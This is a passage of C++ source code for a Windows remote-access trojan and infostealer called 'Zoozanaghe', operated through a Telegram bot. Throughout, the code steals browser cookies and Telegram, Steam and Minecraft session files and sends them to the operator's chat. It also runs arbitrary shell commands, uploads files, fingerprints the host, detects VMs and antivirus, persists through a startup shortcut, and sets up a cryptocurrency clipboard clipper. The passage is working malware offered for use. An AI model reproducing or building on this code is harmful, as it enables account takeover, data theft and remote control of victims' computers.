                    file << "Host: " << cookie.at("host") << "\n"
                         << "Name: " << cookie.at("name") << "\n"
                         << "Value: " << cookie.at("value") << "\n"
                         << "Expires: " << cookie.at("expires") << "\n\n";
                }
            }
            
            file << "\n";
        }
        file.close();
        
        bot.sendMessage(chatId, ss.str(), true);
        bot.sendDocument(chatId, tempFile, "🌐 Browser data");
        fs::remove(tempFile);
    }
    
    void extractTelegramSessions(long long chatId) {
        bot.sendMessage(chatId, "📲 Extracting Telegram sessions...");
        
        auto sessions = TelegramSessionExtractor::extractSessions();
        
        if (sessions.empty()) {
            bot.sendMessage(chatId, "❌ No Telegram sessions found");
            return;
        }
        
        stringstream ss;
        ss << "📲 *Found " << sessions.size() << " Telegram session files:*\n\n";
        
        for (size_t i = 0; i < sessions.size(); i++) {
            ss << i + 1 << ". `" << fs::path(sessions[i]).filename().string() << "`\n";
        }
        
        string tempDir = Utils::getTempPath() + "\\telegram_sessions\\";
        fs::create_directories(tempDir);
        
        for (const auto& session : sessions) {
            try {
                fs::copy(session, tempDir + fs::path(session).filename().string(),
                        fs::copy_options::overwrite_existing);
            } catch (...) {
                // Ignore errors
            }
        }
        
        string zipFile = Utils::getTempPath() + "\\telegram_sessions.zip";
        if (Utils::createZip(tempDir, zipFile)) {
            bot.sendMessage(chatId, ss.str(), true);
            bot.sendDocument(chatId, zipFile, "📲 Telegram sessions");
            fs::remove_all(tempDir);
            fs::remove(zipFile);
        } else {
            bot.sendMessage(chatId, "❌ Failed to create archive");
        }
    }
    
    void extractSteamSessions(long long chatId) {
        bot.sendMessage(chatId, "🎮 Extracting Steam sessions...");
        
        auto sessions = SteamSessionExtractor::extractSessions();
        
        if (sessions.empty()) {
            bot.sendMessage(chatId, "❌ No Steam sessions found");
            return;
        }
        
        stringstream ss;
        ss << "🎮 *Found " << sessions.size() << " Steam session files:*\n\n";
        
        for (size_t i = 0; i < sessions.size(); i++) {
            ss << i + 1 << ". `" << fs::path(sessions[i]).filename().string() << "`\n";
        }        
        string tempDir = Utils::getTempPath() + "\\steam_sessions\\";
        fs::create_directories(tempDir);
        
        for (const auto& session : sessions) {
            try {
                fs::copy(session, tempDir + fs::path(session).filename().string(),
                        fs::copy_options::overwrite_existing);
            } catch (...) {
                // Ignore errors
            }
        }
        
        string zipFile = Utils::getTempPath() + "\\steam_sessions.zip";
        if (Utils::createZip(tempDir, zipFile)) {
            bot.sendMessage(chatId, ss.str(), true);
            bot.sendDocument(chatId, zipFile, "🎮 Steam sessions");
            fs::remove_all(tempDir);
            fs::remove(zipFile);
        } else {
            bot.sendMessage(chatId, "❌ Failed to create archive");
        }
    }
    
    void extractMinecraftSessions(long long chatId) {
        bot.sendMessage(chatId, "⛏️ Extracting Minecraft sessions...");
        
        auto sessions = MinecraftSessionExtractor::extractSessions();
        
        if (sessions.empty()) {
            bot.sendMessage(chatId, "❌ No Minecraft sessions found");
            return;
        }
        
        stringstream ss;
        ss << "⛏️ *Found " << sessions.size() << " Minecraft session files:*\n\n";
        
        for (size_t i = 0; i < sessions.size(); i++) {
            ss << i + 1 << ". `" << fs::path(sessions[i]).filename().string() << "`\n";
        }        
        string tempDir = Utils::getTempPath() + "\\minecraft_sessions\\";
        fs::create_directories(tempDir);
        
        for (const auto& session : sessions) {
            try {
                fs::copy(session, tempDir + fs::path(session).filename().string(),
                        fs::copy_options::overwrite_existing);
            } catch (...) {
                // Ignore errors
            }
        }
        
        string zipFile = Utils::getTempPath() + "\\minecraft_sessions.zip";
        if (Utils::createZip(tempDir, zipFile)) {
            bot.sendMessage(chatId, ss.str(), true);
            bot.sendDocument(chatId, zipFile, "⛏️ Minecraft sessions");
            fs::remove_all(tempDir);
            fs::remove(zipFile);
        } else {
            bot.sendMessage(chatId, "❌ Failed to create archive");
        }
    }
    
    void listDirectory(long long chatId, const string& path) {
        auto files = SystemController::listDirectory(path);
        
        if (files.empty()) {
            bot.sendMessage(chatId, "📁 Directory is empty or not accessible");
            return;
        }
        
        stringstream ss;
        ss << "📁 *Directory: `" << path << "`*\n\n";
        
        for (const auto& file : files) {
            ss << "• " << file << "\n";
        }
        
        bot.sendMessage(chatId, ss.str(), true);
    }
    
    void downloadFile(long long chatId, const string& filePath) {
        if (!fs::exists(filePath)) {
            bot.sendMessage(chatId, "❌ File not found: " + filePath);
            return;
        }
        
        uintmax_t fileSize = fs::file_size(filePath);
        if (fileSize > 50 * 1024 * 1024) { // 50 MB limit
            bot.sendMessage(chatId, "❌ File too large (max 50MB)");
            return;
        }
        
        bot.sendDocument(chatId, filePath, "📁 " + fs::path(filePath).filename().string());
    }
    
    void executeCommand(long long chatId, const string& command) {
        string result = Utils::executeCommand(command);
        
        if (result.length() > 4000) {
            string tempFile = Utils::getTempPath() + "\\command_output.txt";
            ofstream file(tempFile);
            file << "Command: " << command << "\n\n";
            file << result;
            file.close();
            
            bot.sendMessage(chatId, "💻 Command executed (output saved to file)");
            bot.sendDocument(chatId, tempFile, "💻 Command output: " + command);
            fs::remove(tempFile);
        } else {
            string message = "💻 *Command:* `" + command + "`\n\n```\n" + result + "\n```";
            bot.sendMessage(chatId, message, true);
        }
    }
    
    void getSystemInfo(long long chatId) {
        SystemInfo info = SystemController::getSystemInfo();
        
        stringstream ss;
        ss << "🖥️ *System Information*\n"
           << "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
           << "*Computer:* `" << info.computerName << "`\n"
           << "*User:* `" << info.userName << "`\n"
           << "*OS:* `" << info.osVersion << "`\n"
           << "*CPU:* `" << info.cpuInfo << "`\n"
           << "*RAM:* `" << info.ramGB << " GB`\n"
           << "*IP:* `" << info.ipAddress << "`\n"
           << "*MAC:* `" << info.macAddress << "`\n"
           << "*Admin:* " << (info.isAdmin ? "✅" : "❌") << "\n"
           << "*VM:* " << (info.isVM ? "✅" : "❌") << "\n"
           << "*Antivirus:* `" << info.antivirus << "`\n"
           << "*Time Zone:* `" << info.timeZone << "`\n\n"
           << "━━━━━━━━━━━━━━━━━━━━━━━\n"
           << "📅 " << Utils::getCurrentTime() << "\n"
           << "Zoozanaghe — 𐌅𐌋";
        
        bot.sendMessage(chatId, ss.str(), true);
    }
    
    void processMessage(long long chatId, const string& text) {
        if (chatId != adminId) {
            bot.sendMessage(chatId, "🚫 Access denied");
            return;
        }        
        auto it = userStates.find(chatId);
        if (it != userStates.end()) {
            userStates.erase(chatId);
            return;
        }
        
        vector<string> parts = Utils::splitString(text, ' ');
        if (parts.empty()) return;
        
        string command = parts[0];
        vector<string> args(parts.begin() + 1, parts.end());
        
        string lowerCommand = command;
        transform(lowerCommand.begin(), lowerCommand.end(), lowerCommand.begin(), ::tolower);        
        auto cmdIt = commands.find(lowerCommand);
        if (cmdIt != commands.end()) {
            thread([this, chatId, cmdIt, args]() {
                try {
                    cmdIt->second(chatId, args);
                } catch (const exception& e) {
                    bot.sendMessage(chatId, "❌ Error: " + string(e.what()));
                } catch (...) {
                    bot.sendMessage(chatId, "❌ Unknown error occurred");
                }
            }).detach();
        } else {
            bot.sendMessage(chatId, "❌ Unknown command. Use /help for list of commands.");
        }
    }
    
    void pollUpdates() {
        while (running) {
            try {
                Json::Value updates = bot.getUpdates(30);
                
                if (updates["ok"].asBool() && updates.isMember("result")) {
                    for (const auto& update : updates["result"]) {
                        if (update.isMember("message")) {
                            auto message = update["message"];
                            long long chatId = message["chat"]["id"].asInt64();
                            
                            if (message.isMember("text")) {
                                string text = message["text"].asString();
                                processMessage(chatId, text);
                            }
                            
                            if (message.isMember("document")) {
                                long long chatId = message["chat"]["id"].asInt64();
                                if (userStates[chatId] == "awaiting_upload") {
                                    userStates.erase(chatId);
                                }
                            }
                        }
                    }
                }
            } catch (...) {
            }
            
            this_thread::sleep_for(chrono::milliseconds(100));
        }
    }
    
public:
    ZoozanagheBot(const string& token, long long admin) 
        : bot(token), adminId(admin), running(false) {
        
        registerCommands();
    }
    
    ~ZoozanagheBot() {
        stop();
    }
    
    void start() {
        if (running) return;
        
        running = true;
        pollThread = thread(&ZoozanagheBot::pollUpdates, this);        
        cout << R"(
 ________  ________  ________  ________  ________  ________   ________  ________  ___  ___  _______               ________     
|\_____  \|\   __  \|\   __  \|\_____  \|\   __  \|\   ___  \|\   __  \|\   ____\|\  \|\  \|\  ___ \          ___|\   ___ \    
 \|___/  /\ \  \|\  \ \  \|\  \\|___/  /\ \  \|\  \ \  \\ \  \ \  \|\  \ \  \___|\ \  \\\  \ \   __/|        |\__\ \  \_|\ \   
     /  / /\ \  \\\  \ \  \\\  \   /  / /\ \   __  \ \  \\ \  \ \   __  \ \  \  __\ \   __  \ \  \_|/__      \|__|\ \  \ \\ \  
    /  /_/__\ \  \\\  \ \  \\\  \ /  /_/__\ \  \ \  \ \  \\ \  \ \  \ \  \ \  \|\  \ \  \ \  \ \  \_|\ \         __\ \  \_\\ \ 
   |\________\ \_______\ \_______\\________\ \__\ \__\ \__\\ \__\ \__\ \__\ \_______\ \__\ \__\ \_______\       |\__\ \_______\
    \|_______|\|_______|\|_______|\|_______|\|__|\|__|\|__| \|__|\|__|\|__|\|_______|\|__|\|__|\|_______|       \|__|\|_______|                                                                                                                                                                                                                                                                                                                                                                                                
    Zoozanaghe — 𐌅𐌋                                                                                                                         
        )" << endl;
        
        cout << "\n🚀 Bot started successfully!\n";
        cout << "• Admin ID: " << adminId << "\n";
        cout << "• Computer: " << Utils::getComputerName() << "\n";
        cout << "• User: " << Utils::getUserName() << "\n";
        cout << "• IP: " << Utils::getIPAddress() << "\n";
        cout << "• Admin rights: " << (PrivilegeManager::isRunningAsAdmin() ? "Yes" : "No") << "\n";
        cout << "• VM detection: " << (SystemController::isVirtualMachine() ? "Yes" : "No") << "\n";
        cout << "• Time: " << Utils::getCurrentTime() << "\n\n";
        
        cout << "📊 Available commands: " << commands.size() << "\n";
        cout << "🔄 Polling for updates...\n\n";        
        stringstream startupMsg;
        startupMsg << "🚀 *Zoozanaghe Activated*\n"
                  << "━━━━━━━━━━━━━━━━━━━━━━━\n"
                  << "*System:* `" << Utils::getComputerName() << "`\n"
                  << "*User:* `" << Utils::getUserName() << "`\n"
                  << "*IP:* `" << Utils::getIPAddress() << "`\n"
                  << "*Admin:* " << (PrivilegeManager::isRunningAsAdmin() ? "✅" : "❌") << "\n"
                  << "*VM:* " << (SystemController::isVirtualMachine() ? "✅" : "❌") << "\n"
                  << "*Time:* " << Utils::getCurrentTime() << "\n"
                  << "━━━━━━━━━━━━━━━━━━━━━━━\n"
                  << "✅ *Ready for commands...*";
        
        bot.sendMessage(adminId, startupMsg.str(), true);
    }
    
    void stop() {
        running = false;
        if (pollThread.joinable()) {
            pollThread.join();
        }
    }
};

class ConfigManager {
private:
    Json::Value config;
    
public:
    bool load(const string& filename) {
        ifstream file(filename);
        if (!file.is_open()) {
            cerr << "⚠️ Config file not found: " << filename << endl;
            return false;
        }
        
        Json::CharReaderBuilder builder;
        JSONCPP_STRING errors;
        
        if (!Json::parseFromStream(builder, file, &config, &errors)) {
            cerr << "❌ Failed to parse config: " << errors << endl;
            return false;
        }
        
        return true;
    }
    
    bool save(const string& filename) {
        ofstream file(filename);
        if (!file.is_open()) {
            return false;
        }
        
        Json::StreamWriterBuilder writer;
        unique_ptr<Json::StreamWriter> jsonWriter(writer.newStreamWriter());
        jsonWriter->write(config, &file);
        
        return true;
    }
    
    string getString(const string& key, const string& defaultValue = "") {
        return config.get(key, defaultValue).asString();
    }
    
    long long getLong(const string& key, long long defaultValue = 0) {
        return config.get(key, defaultValue).asInt64();
    }
    
    bool getBool(const string& key, bool defaultValue = false) {
        return config.get(key, defaultValue).asBool();
    }
    
    vector<string> getStringArray(const string& key) {
        vector<string> result;
        if (config.isMember(key) && config[key].isArray()) {
            for (const auto& item : config[key]) {
                result.push_back(item.asString());
            }
        }
        return result;
    }
    
    void setString(const string& key, const string& value) {
        config[key] = value;
    }
    
    void setLong(const string& key, long long value) {
        config[key] = value;
    }
    
    void setBool(const string& key, bool value) {
        config[key] = value;
    }
    
    static void createDefaultConfig() {
        Json::Value defaultConfig;
        
        defaultConfig["bot_token"] = "YOUR_BOT_TOKEN_HERE";
        defaultConfig["admin_id"] = 1852417227;
        defaultConfig["startup"] = true;
        defaultConfig["webhook_url"] = "";
        defaultConfig["encryption_key"] = "zoozanaghe_secret_key_2024";        
        Json::Value clipper;
        clipper["btc"] = "YOUR_BTC_ADDRESS_HERE";
        clipper["eth"] = "YOUR_ETH_ADDRESS_HERE";
        clipper["xmr"] = "YOUR_XMR_ADDRESS_HERE";
        defaultConfig["clipper"] = clipper;        
        Json::Value extensions;
        extensions.append(".txt");
        extensions.append(".doc");
        extensions.append(".docx");
        extensions.append(".pdf");
        extensions.append(".xls");
        extensions.append(".xlsx");
        extensions.append(".jpg");
        extensions.append(".png");
        extensions.append(".zip");
        extensions.append(".rar");
        defaultConfig["target_extensions"] = extensions;        
        Json::Value directories;
        directories.append("Desktop");
        directories.append("Documents");
        directories.append("Downloads");
        directories.append("Pictures");
        defaultConfig["target_directories"] = directories;
        
        ofstream file("config.json");
        Json::StreamWriterBuilder writer;
        unique_ptr<Json::StreamWriter> jsonWriter(writer.newStreamWriter());
        jsonWriter->write(defaultConfig, &file);
        file.close();
        
        cout << "✅ Default config created: config.json" << endl;
        cout << "⚠️ Please edit config.json with your settings before running." << endl;
    }
};

int main() {
    CoInitialize(NULL);    
    SetConsoleOutputCP(CP_UTF8);
    
    cout << "🔧 Initializing Zoozanaghe System...\n";    
    if (!PrivilegeManager::isRunningAsAdmin()) {
        cout << "⚠️ Warning: Not running as administrator\n";
        cout << "Some features may not work properly.\n";
        
        cout << "🔑 Attempt to run as administrator? (y/n): ";
        char choice;
        cin >> choice;
        
        if (tolower(choice) == 'y') {
            if (PrivilegeManager::runAsAdmin()) {
                return 0;
            } else {
                cout << "❌ Failed to run as administrator\n";
            }
        }
    }    
    ConfigManager config;
    if (!config.load("config.json")) {
        cout << "⚠️ Creating default configuration...\n";
        ConfigManager::createDefaultConfig();
        cout << "📁 Please edit config.json and restart the program.\n";
        system("pause");
        return 1;
    }
    
    string botToken = config.getString("bot_token");
    long long adminId = config.getLong("admin_id");
    bool autoStartup = config.getBool("startup", true);
    string encryptionKey = config.getString("encryption_key", "zoozanaghe_secret_key_2024");
    
    if (botToken == "YOUR_BOT_TOKEN_HERE" || botToken.empty()) {
        cout << "❌ Please set your bot token in config.json\n";
        system("pause");
        return 1;
    }
    
    if (SystemController::isVirtualMachine()) {
        cout << "⚠️ Running in virtual machine environment\n";
    }
    
    if (autoStartup) {
        Utils::createStartupShortcut();
    }
    
    SystemController::startClipboardMonitor();
        ZoozanagheBot bot(botToken, adminId);    
    SetConsoleCtrlHandler([](DWORD dwCtrlType) -> BOOL {
        if (dwCtrlType == CTRL_C_EVENT || dwCtrlType == CTRL_CLOSE_EVENT) {
            cout << "\n\n🛑 Shutting down...\n";
            return TRUE;
        }
        return FALSE;
    }, TRUE);
    
    cout << "\n🎯 Starting Zoozanaghe Bot...\n";
    bot.start();    
    while (true) {
        this_thread::sleep_for(chrono::seconds(1));
    }
    
    CoUninitialize();
    return 0;
}